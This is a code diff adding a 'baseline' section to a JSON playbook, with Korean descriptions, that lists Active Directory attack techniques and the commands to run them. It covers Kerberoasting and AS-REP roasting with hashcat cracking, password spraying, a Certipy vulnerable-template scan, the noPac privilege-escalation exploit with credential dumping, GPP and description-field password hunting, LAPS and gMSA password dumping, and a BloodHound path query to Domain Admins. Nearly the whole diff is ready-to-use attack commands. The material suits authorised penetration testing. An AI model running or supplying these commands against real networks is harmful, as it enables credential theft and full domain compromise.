@@ -533,6 +533,80 @@
     }
   },
 
+  "baseline": [
+    {
+      "name": "Kerberoasting (SPN 계정)",
+      "ko": "유효 크레덴셜로 SPN 보유 계정 TGS 요청 -> 오프라인 크랙. 엣지 불필요.",
+      "cmd": [
+        "impacket-GetUserSPNs 'corp.local/attacker:Passw0rd!' -dc-ip dc01 -request -outputfile spn.txt",
+        "hashcat -m 13100 spn.txt rockyou.txt"
+      ],
+      "tools": [{"name": "impacket GetUserSPNs.py", "type": "py", "url": "https://github.com/fortra/impacket"}]
+    },
+    {
+      "name": "AS-REP Roasting (사전인증 미요구)",
+      "ko": "DONT_REQ_PREAUTH 계정 AS-REP 요청 -> 크랙. 크레덴셜 없이도 사용자명만 있으면 가능.",
+      "cmd": [
+        "impacket-GetNPUsers 'corp.local/attacker:Passw0rd!' -request -dc-ip dc01 -outputfile asrep.txt",
+        "hashcat -m 18200 asrep.txt rockyou.txt"
+      ],
+      "tools": [{"name": "impacket GetNPUsers.py", "type": "py", "url": "https://github.com/fortra/impacket"}]
+    },
+    {
+      "name": "패스워드 스프레이 (계정 잠금 주의)",
+      "ko": "도메인 정책 확인 후 흔한 비번을 전 사용자에 시도. 잠금 임계값-1 회만.",
+      "cmd": [
+        "nxc smb dc01 -u attacker -p 'Passw0rd!' --pass-pol",
+        "nxc smb dc01 -u users.txt -p 'Season2025!' --continue-on-success"
+      ],
+      "tools": [{"name": "NetExec", "type": "py", "url": "https://github.com/Pennyw0rth/NetExec"}]
+    },
+    {
+      "name": "AD CS 취약 점검 (ESC1~13)",
+      "ko": "인증서 서비스 취약 템플릿/CA 는 어떤 도메인 사용자든 점검 가능.",
+      "cmd": ["certipy find -u attacker@corp.local -p 'Passw0rd!' -dc-ip dc01 -vulnerable -stdout"],
+      "tools": [{"name": "Certipy", "type": "py", "url": "https://github.com/ly4k/Certipy"}]
+    },
+    {
+      "name": "noPac (CVE-2021-42278/42287)",
+      "ko": "머신계정 생성 권한(MachineAccountQuota>0)만 있으면 일반 사용자 -> Domain Admin.",
+      "cmd": [
+        "nxc ldap dc01 -u attacker -p 'Passw0rd!' -M maq",
+        "python3 noPac.py corp.local/attacker:'Passw0rd!' -dc-ip dc01 -dc-host DC01 --impersonate administrator -use-ldap -dump"
+      ],
+      "tools": [{"name": "noPac", "type": "py", "url": "https://github.com/Ridter/noPac"}]
+    },
+    {
+      "name": "자격증명 사냥 (GPP·설명필드·공유)",
+      "ko": "SYSVOL GPP cpassword, 사용자 description/info 의 평문 비번, 공유의 설정파일 탐색.",
+      "cmd": [
+        "nxc smb dc01 -u attacker -p 'Passw0rd!' -M gpp_password -M gpp_autologin",
+        "nxc ldap dc01 -u attacker -p 'Passw0rd!' -M user-desc",
+        "nxc smb targets.txt -u attacker -p 'Passw0rd!' -M spider_plus"
+      ],
+      "tools": [{"name": "NetExec", "type": "py", "url": "https://github.com/Pennyw0rth/NetExec"}]
+    },
+    {
+      "name": "LDAP 빠른 수확 (위임·LAPS·gMSA)",
+      "ko": "무제약/제약 위임 계정, 읽을 수 있는 LAPS 비번, gMSA 를 크레덴셜로 한 번에 조회.",
+      "cmd": [
+        "nxc ldap dc01 -u attacker -p 'Passw0rd!' --trusted-for-delegation --admin-count",
+        "nxc ldap dc01 -u attacker -p 'Passw0rd!' -M laps",
+        "python3 gMSADumper.py -u attacker -p 'Passw0rd!' -d corp.local"
+      ],
+      "tools": [{"name": "NetExec / gMSADumper", "type": "py", "url": "https://github.com/Pennyw0rth/NetExec"}]
+    },
+    {
+      "name": "BloodHound 재검토 (경로 탐색)",
+      "ko": "owned 로 표시하고 Domain Admins 까지 shortestPath 쿼리로 간접 경로 확인.",
+      "cmd": [
+        "# BloodHound GUI 에서 소유 계정 우클릭 -> Mark as Owned",
+        "# Cypher: MATCH p=shortestPath((n {owned:true})-[*1..]->(m:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p"
+      ],
+      "tools": [{"name": "BloodHound", "type": "py", "url": "https://github.com/SpecterOps/BloodHound"}]
+    }
+  ],
+
   "group_privesc": {
     "_note": "이름 있는 특권 그룹 멤버십은 ACL 엣지가 아니라 PETS 가 엣지로는 못 잡는다. 그룹 이름(부분일치)으로 알려진 기법을 매핑. owned 가 속한 그룹을 최우선.",
     "AZURE ADMINS": {
